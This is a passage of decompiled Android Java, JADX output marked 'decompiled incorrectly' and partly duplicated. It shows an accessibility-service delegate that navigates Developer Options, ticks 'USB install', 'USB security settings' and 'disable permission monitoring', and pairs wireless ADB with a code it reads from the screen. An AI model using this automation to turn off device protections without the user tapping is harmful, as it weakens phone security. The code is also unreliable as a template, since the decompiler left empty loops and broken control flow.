                        /* JADX WARN: Removed duplicated region for block: B:253:0x042e A[ADDED_TO_REGION] */
                        /* JADX WARN: Removed duplicated region for block: B:262:0x043b A[ADDED_TO_REGION, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:318:0x04da A[Catch: Exception -> 0x04e9, LOOP:8: B:310:0x04b8->B:318:0x04da, LOOP_END, TryCatch #4 {Exception -> 0x04e9, blocks: (B:295:0x0460, B:297:0x0473, B:299:0x0479, B:301:0x047f, B:303:0x048c, B:305:0x049a, B:307:0x04a5, B:309:0x04b0, B:318:0x04da, B:320:0x04e3, B:325:0x04d4, B:311:0x04b8, B:313:0x04be, B:315:0x04cc), top: B:294:0x0460, inners: #7 }] */
                        /* JADX WARN: Removed duplicated region for block: B:319:0x04e3 A[SYNTHETIC] */
                        @Override // java.lang.Runnable
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final void run() {
                            boolean z3;
                            boolean m998O;
                            UiObject findOneByCombine;
                            String str4;
                            boolean z4;
                            UiObject findOneByCombine2;
                            String str5;
                            boolean z5;
                            UiObject uiObject;
                            UiObject uiObject2;
                            UiObject uiObject3;
                            String str6;
                            CombineFilter u02;
                            EnumC0894g enumC0894g3 = EnumC0894g.PAIR_DEPT_PAIR_SUCCESS;
                            int i4 = i2;
                            boolean z6 = true;
                            a0 a0Var = this.f975b;
                            switch (i4) {
                                case 0:
                                    a0.m982H(a0Var);
                                    break;
                                case 1:
                                    a0.m982H(a0Var);
                                    break;
                                case 2:
                                    a0Var.getClass();
                                    try {
                                        if (a0.t0()) {
                                            a0Var.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_PREPARE_FINISH);
                                            if (AbstractC0249e.m620i()) {
                                                AtomicInteger atomicInteger = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f02 = a0Var.f0();
                                                        if (f02 != null && f02.canScrollForward()) {
                                                            f02.scrollForwardEnd();
                                                            a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                            AbstractC0251g.T0(5);
                                                            f02 = a0Var.f0();
                                                        }
                                                        if (f02 != null) {
                                                            uiObject = f02.canScrollBackward() ? f02.scrollBackwardUtil(a0.F0()) : null;
                                                            if (uiObject == null && f02.canScrollForward()) {
                                                                uiObject = f02.scrollForwardUtil(a0.F0());
                                                            }
                                                        } else {
                                                            uiObject = null;
                                                        }
                                                        if (uiObject != null && uiObject.parent() != null && a0Var.g0(uiObject.parent(), 20).isChecked()) {
                                                            a0Var.f844s = true;
                                                            Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                                                        }
                                                    } catch (Exception e2) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
                                                    }
                                                    if (!a0Var.f844s && atomicInteger.incrementAndGet() <= 10) {
                                                        AbstractC0251g.T0(10);
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                a0Var.D0();
                                            }
                                            if (AbstractC0249e.m624m()) {
                                                AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f03 = a0Var.f0();
                                                        if (f03 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                                            findOneByCombine2 = f03.scrollForwardUtil(c0981d);
                                                            if (findOneByCombine2 == null) {
                                                                f03.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f04 = a0Var.f0();
                                                                if (f04 != null) {
                                                                    findOneByCombine2 = f04.scrollForwardUtil(c0981d);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine2 = a0Var.m1072k().findOneByCombine(a0.R0());
                                                        }
                                                    } catch (Exception e3) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e3);
                                                    }
                                                    if (findOneByCombine2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                                                        UiObject findParentUtilCombine = findOneByCombine2.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                                            CheckedResult e02 = a0.e0(findParentUtilCombine);
                                                            a0Var.f845t = e02.isChecked();
                                                            z5 = e02.isClicked();
                                                            if (z5) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已点击");
                                                                AbstractC0251g.T0(10);
                                                            }
                                                            if (a0Var.f845t) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                                                            }
                                                            if (a0Var.f845t && atomicInteger2.incrementAndGet() <= 10) {
                                                                AbstractC0251g.T0(10);
                                                            }
                                                        } else {
                                                            str5 = "USB安装可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str5 = "USB安装栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str5);
                                                    z5 = false;
                                                    if (z5) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(70);
                                                atomicInteger2.set(0);
                                                while (true) {
                                                    try {
                                                        UiObject f05 = a0Var.f0();
                                                        if (f05 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                                            findOneByCombine = f05.scrollForwardUtil(c0981d2);
                                                            if (findOneByCombine == null) {
                                                                f05.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f06 = a0Var.f0();
                                                                if (f06 != null) {
                                                                    findOneByCombine = f06.scrollForwardUtil(c0981d2);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine = a0Var.m1072k().findOneByCombine(a0.S0());
                                                        }
                                                    } catch (Exception e4) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
                                                    }
                                                    if (findOneByCombine != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                                                        UiObject findParentUtilCombine2 = findOneByCombine.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine2 != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                                            CheckedResult e03 = a0.e0(findParentUtilCombine2);
                                                            a0Var.f846u = e03.isChecked();
                                                            z4 = e03.isClicked();
                                                            if (a0Var.f846u) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                            }
                                                            if (z4) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                                                            }
                                                            AtomicInteger atomicInteger32 = new AtomicInteger(10);
                                                            for (m998O = a0Var.m998O(); !m998O; m998O = a0Var.m998O()) {
                                                                try {
                                                                } catch (Exception e5) {
                                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e5);
                                                                }
                                                                if (atomicInteger32.decrementAndGet() >= 0) {
                                                                    AbstractC0251g.T0(1);
                                                                } else if (!a0Var.f846u && !m998O && atomicInteger2.incrementAndGet() <= 10) {
                                                                    AbstractC0251g.T0(10);
                                                                }
                                                            }
                                                            if (!a0Var.f846u) {
                                                            }
                                                        } else {
                                                            str4 = "USB安全设置可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str4 = "USB安全设置栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str4);
                                                    z4 = false;
                                                    if (a0Var.f846u) {
                                                    }
                                                    if (z4) {
                                                    }
                                                    AtomicInteger atomicInteger322 = new AtomicInteger(10);
                                                    while (!m998O) {
                                                    }
                                                    if (!a0Var.f846u) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                if (a0Var.f846u) {
                                                    Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                }
                                            }
                                            a0Var.f840o.remove("pairInPrepareFinish");
                                            break;
                                        }
                                        a0Var.D0();
                                        a0Var.f840o.remove("pairInPrepareFinish");
                                    } catch (Exception e6) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e6);
                                        return;
                                    }
                                    break;
                                case 3:
                                    a0Var.getClass();
                                    try {
                                        a0Var.f840o.remove("pairInPairSuccess");
                                        if (!a0.t0()) {
                                            a0Var.D0();
                                            break;
                                        } else {
                                            if (AbstractC0249e.m624m() && Build.VERSION.SDK_INT >= 35) {
                                                if (AbstractC0026q.m172b()) {
                                                    AbstractC0251g.T0(5);
                                                    if (!AbstractC0026q.m150A()) {
                                                        AbstractC0026q.m164O(null, null);
                                                    }
                                                }
                                                if (AbstractC0251g.f1()) {
                                                }
                                            }
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                                break;
                                            } catch (Exception e7) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e7);
                                                return;
                                            }
                                        }
                                    } catch (Exception e8) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e8);
                                        return;
                                    }
                                    break;
                                case 4:
                                    AtomicReference atomicReference2 = a0Var.f841p;
                                    try {
                                        if (!Objects.equals(atomicReference2.get(), enumC0894g3)) {
                                            a0Var.m1062G();
                                            Log.d("PairAccessibilityDelegate", "active root complete");
                                            atomicReference2.set(EnumC0894g.PAIR_DEPT_PAIR_LEAVE_DEV_OPT);
                                            a0.m985R(a0Var.m1072k());
                                            try {
                                                u02 = a0.u0();
                                                uiObject2 = null;
                                            } catch (Exception e9) {
                                                e = e9;
                                                uiObject2 = null;
                                            }
                                            while (uiObject2 == null) {
                                                try {
                                                } catch (Exception e10) {
                                                    e = e10;
                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e);
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                    return;
                                                }
                                                if (a0Var.m1072k() != null) {
                                                    uiObject2 = a0Var.m1072k().findOneByCombine(u02);
                                                    AbstractC0251g.T0(5);
                                                } else {
                                                    if (uiObject2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                    }
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                        AbstractC0184g.m354h(30);
                                                        UiObject findParentUtilCombine3 = uiObject3.findParentUtilCombine(a0.m987T());
                                                        if (findParentUtilCombine3 != null && findParentUtilCombine3.click()) {
                                                            Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                                                            AbstractC0184g.m354h(35);
                                                            break;
                                                        } else {
                                                            str6 = "使用配对码配对栏目点击失败";
                                                        }
                                                    } else {
                                                        str6 = "使用配对码配对栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                }
                                            }
                                            if (uiObject2 != null) {
                                            }
                                            uiObject3 = uiObject2;
                                            if (uiObject3 != null) {
                                            }
                                            Log.e("PairAccessibilityDelegate", str6);
                                        }
                                    } catch (Exception e11) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e11);
                                        return;
                                    }
                                    break;
                                case 5:
                                    a0Var.getClass();
                                    try {
                                        boolean m996M = a0Var.m996M();
                                        AtomicReference atomicReference3 = a0Var.f841p;
                                        String str7 = a0Var.f864c;
                                        if (m996M && !a0Var.m1000Q() && !Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            Object obj2 = atomicReference3.get();
                                            EnumC0894g enumC0894g4 = EnumC0894g.PAIR_DEPT_PAIRING;
                                            if (!Objects.equals(obj2, enumC0894g4)) {
                                                Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                                                a0Var.m1062G();
                                                Log.d("PairAccessibilityDelegate", "active root complete");
                                                atomicReference3.set(enumC0894g4);
                                                Future m592b = AbstractC0243l.m592b(new CallableC0239h(a0Var), str7);
                                                if (m592b != null) {
                                                    while (!m592b.isDone()) {
                                                        Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                                                        AbstractC0251g.T0(2);
                                                    }
                                                    try {
                                                        PairPortAndCodeResult pairPortAndCodeResult = (PairPortAndCodeResult) m592b.get();
                                                        if (pairPortAndCodeResult != null) {
                                                            Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                                                            AbstractC0184g.m354h(40);
                                                            if (C0318e.m844S() != null) {
                                                                Log.d("PairAccessibilityDelegate", "正在发起配对");
                                                                C0318e.m844S().f615m.set(false);
                                                                C0318e.m844S().m852K(pairPortAndCodeResult.getHost(), pairPortAndCodeResult.getPairPort().intValue(), pairPortAndCodeResult.getPairCode());
                                                                if (C0318e.m844S().m860U()) {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对成功");
                                                                    AbstractC0184g.m354h(45);
                                                                    atomicReference3.set(enumC0894g3);
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对失败");
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                                                        }
                                                    } catch (Exception e12) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e12);
                                                    }
                                                }
                                            }
                                        }
                                        if (!Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            atomicReference3.set(EnumC0894g.PAIR_DEPT_PAIR_FAIL);
                                        }
                                        if (a0Var.m996M()) {
                                            Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
                                            if (atomicReference3.get() != enumC0894g3) {
                                                z6 = false;
                                            }
                                            AbstractC0243l.m592b(new CallableC0238g(z6, a0Var), str7);
                                            break;
                                        }
                                    } catch (Exception e13) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e13);
                                        return;
                                    }
                                    break;
                                case 6:
                                    a0Var.getClass();
                                    while (a0Var.m997N()) {
                                        try {
                                            UiObject findOneByCombine3 = a0Var.m1072k().findOneByCombine(a0.m989V());
                                            if (findOneByCombine3 != null && findOneByCombine3.click()) {
                                                Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                                                AbstractC0251g.T0(10);
                                            }
                                        } catch (Exception e14) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e14);
                                            return;
                                        }
                                    }
                                    ConcurrentLinkedQueue concurrentLinkedQueue2 = a0Var.f840o;
                                    concurrentLinkedQueue2.remove("pairInWifiDebugWindow");
                                    concurrentLinkedQueue2.remove("pairInPairCodeDialog");
                                    concurrentLinkedQueue2.remove("pairInPairFailDialog");
                                    break;
                                case 7:
                                    a0Var.getClass();
                                    while (a0Var.m1078q(C0420i.m1117L())) {
                                        try {
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                            } catch (Exception e15) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e15);
                                            }
                                            AbstractC0251g.T0(5);
                                        } catch (Exception e16) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e16);
                                        }
                                    }
                                    break;
                                default:
                                    a0Var.getClass();
                                    try {
                                        Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");
                                        UiObject findOneByCombine4 = a0Var.m1072k().findOneByCombine(a0.K0());
                                        if (findOneByCombine4 != null && findOneByCombine4.clickable() && findOneByCombine4.click()) {
                                            Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                                            a0Var.f840o.remove("pairInSecurityCenter");
                                            break;
                                        } else {
                                            UiObject findOneByCombine5 = a0Var.m1072k().findOneByCombine(a0.J0());
                                            if (findOneByCombine5 != null) {
                                                Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
                                                if (findOneByCombine5.clickable()) {
                                                    Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
                                                    if (findOneByCombine5.click()) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
                                                        AbstractC0251g.T0(10);
                                                        while (true) {
                                                            try {
                                                            } catch (Exception e17) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e17);
                                                            }
                                                            if (a0Var.m1072k() != null && a0Var.m1072k().findOneByCombine(a0.L0()) != null) {
                                                                Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                                                                z3 = true;
                                                                if (z3) {
                                                                    a0Var.f846u = true;
                                                                    a0Var.D0();
                                                                    break;
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                                                                    AbstractC0251g.T0(5);
                                                                }
                                                            }
                                                            z3 = false;
                                                            if (z3) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    } catch (Exception e18) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e18);
                                        return;
                                    }
                                    break;
                            }
                        }
                    }, str3);
                }
                if ((atomicReference.get() == enumC0894g || atomicReference.get() == EnumC0894g.PAIR_DEPT_PAIR_FAIL) && !concurrentLinkedQueue.contains("pairInPrepareFinish")) {
                    concurrentLinkedQueue.add("pairInPrepareFinish");
                    final int i4 = 2;
                    AbstractC0243l.m593c(new Runnable(this) { // from class: o.y

                        /* renamed from: b */
                        public final /* synthetic */ a0 f975b;

                        {
                            this.f975b = this;
                        }

                        /* JADX WARN: Removed duplicated region for block: B:107:0x01a8 A[Catch: Exception -> 0x01a4, TRY_LEAVE, TryCatch #14 {Exception -> 0x01a4, blocks: (B:102:0x0192, B:104:0x0198, B:107:0x01a8), top: B:101:0x0192 }] */
                        /* JADX WARN: Removed duplicated region for block: B:111:0x01b7 A[Catch: Exception -> 0x01e3, TryCatch #15 {Exception -> 0x01e3, blocks: (B:94:0x016e, B:96:0x0178, B:111:0x01b7, B:113:0x01c9, B:115:0x01cf, B:118:0x01df, B:123:0x01b1), top: B:93:0x016e }] */
                        /* JADX WARN: Removed duplicated region for block: B:120:0x01dd  */
                        /* JADX WARN: Removed duplicated region for block: B:216:0x0357 A[Catch: Exception -> 0x0369, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:219:0x0363 A[Catch: Exception -> 0x0369, TRY_LEAVE, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:241:0x03fe A[Catch: Exception -> 0x0409, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:243:0x0403 A[Catch: Exception -> 0x0409, TRY_LEAVE, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:246:0x0418 A[EXC_TOP_SPLITTER, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:253:0x042e A[ADDED_TO_REGION] */
                        /* JADX WARN: Removed duplicated region for block: B:262:0x043b A[ADDED_TO_REGION, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:318:0x04da A[Catch: Exception -> 0x04e9, LOOP:8: B:310:0x04b8->B:318:0x04da, LOOP_END, TryCatch #4 {Exception -> 0x04e9, blocks: (B:295:0x0460, B:297:0x0473, B:299:0x0479, B:301:0x047f, B:303:0x048c, B:305:0x049a, B:307:0x04a5, B:309:0x04b0, B:318:0x04da, B:320:0x04e3, B:325:0x04d4, B:311:0x04b8, B:313:0x04be, B:315:0x04cc), top: B:294:0x0460, inners: #7 }] */
                        /* JADX WARN: Removed duplicated region for block: B:319:0x04e3 A[SYNTHETIC] */
                        @Override // java.lang.Runnable
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final void run() {
                            boolean z3;
                            boolean m998O;
                            UiObject findOneByCombine;
                            String str4;
                            boolean z4;
                            UiObject findOneByCombine2;
                            String str5;
                            boolean z5;
                            UiObject uiObject;
                            UiObject uiObject2;
                            UiObject uiObject3;
                            String str6;
                            CombineFilter u02;
                            EnumC0894g enumC0894g3 = EnumC0894g.PAIR_DEPT_PAIR_SUCCESS;
                            int i42 = i4;
                            boolean z6 = true;
                            a0 a0Var = this.f975b;
                            switch (i42) {
                                case 0:
                                    a0.m982H(a0Var);
                                    break;
                                case 1:
                                    a0.m982H(a0Var);
                                    break;
                                case 2:
                                    a0Var.getClass();
                                    try {
                                        if (a0.t0()) {
                                            a0Var.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_PREPARE_FINISH);
                                            if (AbstractC0249e.m620i()) {
                                                AtomicInteger atomicInteger = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f02 = a0Var.f0();
                                                        if (f02 != null && f02.canScrollForward()) {
                                                            f02.scrollForwardEnd();
                                                            a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                            AbstractC0251g.T0(5);
                                                            f02 = a0Var.f0();
                                                        }
                                                        if (f02 != null) {
                                                            uiObject = f02.canScrollBackward() ? f02.scrollBackwardUtil(a0.F0()) : null;
                                                            if (uiObject == null && f02.canScrollForward()) {
                                                                uiObject = f02.scrollForwardUtil(a0.F0());
                                                            }
                                                        } else {
                                                            uiObject = null;
                                                        }
                                                        if (uiObject != null && uiObject.parent() != null && a0Var.g0(uiObject.parent(), 20).isChecked()) {
                                                            a0Var.f844s = true;
                                                            Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                                                        }
                                                    } catch (Exception e2) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
                                                    }
                                                    if (!a0Var.f844s && atomicInteger.incrementAndGet() <= 10) {
                                                        AbstractC0251g.T0(10);
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                a0Var.D0();
                                            }
                                            if (AbstractC0249e.m624m()) {
                                                AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f03 = a0Var.f0();
                                                        if (f03 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                                            findOneByCombine2 = f03.scrollForwardUtil(c0981d);
                                                            if (findOneByCombine2 == null) {
                                                                f03.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f04 = a0Var.f0();
                                                                if (f04 != null) {
                                                                    findOneByCombine2 = f04.scrollForwardUtil(c0981d);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine2 = a0Var.m1072k().findOneByCombine(a0.R0());
                                                        }
                                                    } catch (Exception e3) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e3);
                                                    }
                                                    if (findOneByCombine2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                                                        UiObject findParentUtilCombine = findOneByCombine2.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                                            CheckedResult e02 = a0.e0(findParentUtilCombine);
                                                            a0Var.f845t = e02.isChecked();
                                                            z5 = e02.isClicked();
                                                            if (z5) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已点击");
                                                                AbstractC0251g.T0(10);
                                                            }
                                                            if (a0Var.f845t) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                                                            }
                                                            if (a0Var.f845t && atomicInteger2.incrementAndGet() <= 10) {
                                                                AbstractC0251g.T0(10);
                                                            }
                                                        } else {
                                                            str5 = "USB安装可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str5 = "USB安装栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str5);
                                                    z5 = false;
                                                    if (z5) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(70);
                                                atomicInteger2.set(0);
                                                while (true) {
                                                    try {
                                                        UiObject f05 = a0Var.f0();
                                                        if (f05 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                                            findOneByCombine = f05.scrollForwardUtil(c0981d2);
                                                            if (findOneByCombine == null) {
                                                                f05.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f06 = a0Var.f0();
                                                                if (f06 != null) {
                                                                    findOneByCombine = f06.scrollForwardUtil(c0981d2);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine = a0Var.m1072k().findOneByCombine(a0.S0());
                                                        }
                                                    } catch (Exception e4) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
                                                    }
                                                    if (findOneByCombine != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                                                        UiObject findParentUtilCombine2 = findOneByCombine.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine2 != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                                            CheckedResult e03 = a0.e0(findParentUtilCombine2);
                                                            a0Var.f846u = e03.isChecked();
                                                            z4 = e03.isClicked();
                                                            if (a0Var.f846u) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                            }
                                                            if (z4) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                                                            }
                                                            AtomicInteger atomicInteger322 = new AtomicInteger(10);
                                                            for (m998O = a0Var.m998O(); !m998O; m998O = a0Var.m998O()) {
                                                                try {
                                                                } catch (Exception e5) {
                                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e5);
                                                                }
                                                                if (atomicInteger322.decrementAndGet() >= 0) {
                                                                    AbstractC0251g.T0(1);
                                                                } else if (!a0Var.f846u && !m998O && atomicInteger2.incrementAndGet() <= 10) {
                                                                    AbstractC0251g.T0(10);
                                                                }
                                                            }
                                                            if (!a0Var.f846u) {
                                                            }
                                                        } else {
                                                            str4 = "USB安全设置可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str4 = "USB安全设置栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str4);
                                                    z4 = false;
                                                    if (a0Var.f846u) {
                                                    }
                                                    if (z4) {
                                                    }
                                                    AtomicInteger atomicInteger3222 = new AtomicInteger(10);
                                                    while (!m998O) {
                                                    }
                                                    if (!a0Var.f846u) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                if (a0Var.f846u) {
                                                    Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                }
                                            }
                                            a0Var.f840o.remove("pairInPrepareFinish");
                                            break;
                                        }
                                        a0Var.D0();
                                        a0Var.f840o.remove("pairInPrepareFinish");
                                    } catch (Exception e6) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e6);
                                        return;
                                    }
                                    break;
                                case 3:
                                    a0Var.getClass();
                                    try {
                                        a0Var.f840o.remove("pairInPairSuccess");
                                        if (!a0.t0()) {
                                            a0Var.D0();
                                            break;
                                        } else {
                                            if (AbstractC0249e.m624m() && Build.VERSION.SDK_INT >= 35) {
                                                if (AbstractC0026q.m172b()) {
                                                    AbstractC0251g.T0(5);
                                                    if (!AbstractC0026q.m150A()) {
                                                        AbstractC0026q.m164O(null, null);
                                                    }
                                                }
                                                if (AbstractC0251g.f1()) {
                                                }
                                            }
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                                break;
                                            } catch (Exception e7) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e7);
                                                return;
                                            }
                                        }
                                    } catch (Exception e8) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e8);
                                        return;
                                    }
                                    break;
                                case 4:
                                    AtomicReference atomicReference2 = a0Var.f841p;
                                    try {
                                        if (!Objects.equals(atomicReference2.get(), enumC0894g3)) {
                                            a0Var.m1062G();
                                            Log.d("PairAccessibilityDelegate", "active root complete");
                                            atomicReference2.set(EnumC0894g.PAIR_DEPT_PAIR_LEAVE_DEV_OPT);
                                            a0.m985R(a0Var.m1072k());
                                            try {
                                                u02 = a0.u0();
